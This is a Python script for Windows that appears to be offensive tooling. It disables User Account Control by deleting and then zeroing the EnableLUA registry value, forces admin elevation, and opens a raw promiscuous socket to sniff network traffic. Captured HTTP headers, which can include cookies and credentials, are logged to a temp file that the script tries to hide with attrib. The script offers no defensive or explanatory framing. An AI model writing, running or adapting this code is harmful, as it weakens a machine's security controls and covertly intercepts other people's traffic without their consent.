#!python
# coding: utf-8
import sys
import ctypes
import socket
import os
import datetime
import subprocess
import win32com.shell.shell as win32shell


def killUAC():
    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
    win32shell.ShellExecuteEx(
        lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
    win32shell.ShellExecuteEx(
        lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)

def run_as_admin(argv=None, debug=False):	
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # Support pyinstaller wrapped program.
        arguments = list(map(str, argv[1:]))
    else:
        arguments = list(map(str, argv))
    argument_line = ' '.join(arguments)
    executable = str(sys.executable)
    if debug:
        print('Command line: ', executable, argument_line)
    ret = shell32.ShellExecuteW(
        None, "runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None

def capture():
	HOST = socket.gethostbyname(socket.gethostname())
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
	sock.bind((HOST, 2441))
	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
	result = "C:/Users/Default/AppData/Local/Temp/output.txt"

	while True:
		try:
			data = sock.recvfrom(65535)
			conv = data[0].decode("utf-8", "replace").split("\r\n\r\n")
			if "HTTP" in conv[0][40:]:
				raw = conv[0][40:]
				xtime = datetime.datetime.now()
				with open(result, "a") as f:
					print("[", "="*25, "HEADER CAPTURED", "="*25, "]",
					      "\n", "At :", xtime, "\n", raw, file=f)

			else:
				pass

		except Exception:
			continue

	subprocess.check_call(["attrib", "+H", result])

if __name__ == '__main__':
	killUAC()
	ret = run_as_admin()
	if ret is True:
		capture()
		print('I have admin privilege.')
		input('Press ENTER to exit.')
	elif ret is None:
		print('I am elevating to admin privilege.')
		input('Press ENTER to exit.')
		capture()
	else:
		print('Error(ret=%d): cannot elevate privilege.' % (ret, ))
